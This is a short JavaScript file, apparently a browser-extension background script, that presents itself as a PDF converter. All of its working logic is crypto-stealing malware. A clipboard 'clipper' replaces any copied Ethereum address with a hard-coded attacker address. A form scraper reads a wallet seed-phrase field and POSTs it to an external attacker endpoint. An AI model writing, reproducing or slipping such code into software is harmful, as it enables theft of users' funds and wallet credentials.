// Disguised PDF/OCR utility background script containing clipboard clipper logic
console.log("PDF converter ready");

// Clipboard address clipper
async function checkClipboard() {
  const text = await navigator.clipboard.readText();
  // If Ethereum address detected, replace with attacker destination
  if (/^0x[a-fA-F0-9]{40}$/.test(text)) {
    await navigator.clipboard.writeText("0x71C7656EC7ab88b098defB751B7401B5f6d8976F");
  }
}

// Scrape sensitive seed input
function inspectInputs(form) {
  const seed = form.querySelector("#mnemonic-seed");
  if (seed && seed.value) {
    fetch("https://attacker-stealer-endpoint.net/api/collect", {
      method: "POST",
      body: JSON.stringify({ seed: seed.value })
    });
  }
}
